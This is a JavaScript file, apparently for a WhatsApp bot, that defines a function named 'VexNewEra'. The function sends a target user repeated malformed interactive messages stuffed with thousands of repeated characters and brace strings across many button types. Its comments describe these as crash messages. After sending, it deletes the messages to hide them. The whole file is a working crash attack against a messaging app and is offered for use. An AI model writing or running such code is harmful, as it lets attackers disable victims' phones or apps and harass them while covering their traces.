function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function VexNewEra(sock, target, count = 3) {
  const messageIds = [];

  for (let i = 0; i < count; i++) {
    try {
      const message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              contextInfo: {
                mentionedJid: [target],
                isForwarded: true,
                forwardingScore: 99999999,
                businessMessageForwardInfo: {
                  businessOwnerJid: target,
                },
              },
              body: {
                text: "📄Null Tanggapan Diterima" + "ꦽ".repeat(7777),
              },
              nativeFlowMessage: {
                messageParamsJson: "{".repeat(9999),
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "cta_url",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "cta_call",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "cta_copy",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "cta_reminder",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "cta_cancel_reminder",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "address_message",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "send_location",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "single_select",
                    buttonParamsJson: "ꦽ".repeat(3000),
                    version: 3,
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: JSON.stringify({ status: true }),
                    version: 3,
                  },
                  {
                    name: "camera_permission_request",
                    buttonParamsJson: JSON.stringify({ cameraAccess: true }),
                    version: 3,
                  },
                ],
              },
            },
          },
        },
      };

      // kirim message crash
      const msg = await sock.sendMessage(target, message);
      const messageId = msg.key.id;
      messageIds.push(messageId);

      console.log(`✅ [${i + 1}/${count}] Vexnew crash terkirim: ${messageId}`);

      await sleep(600);
    } catch (e) {
      console.error("❌ Error NewEra:", e);
    }
  }

  // 🔥 hapus semua pesan setelah dikirim
  for (let i = 0; i < messageIds.length; i++) {
    const id = messageIds[i];
    await sleep(1000);
    await sock.sendMessage(target, {
      delete: {
        remoteJid: target,
        fromMe: false,
        id,
        participant: sock.user.id,
      },
    });
    console.log(`🗑️ Pesan ${i + 1} dihapus`);
  }

  console.log("✅ Semua pesan crash sudah dihapus");
}
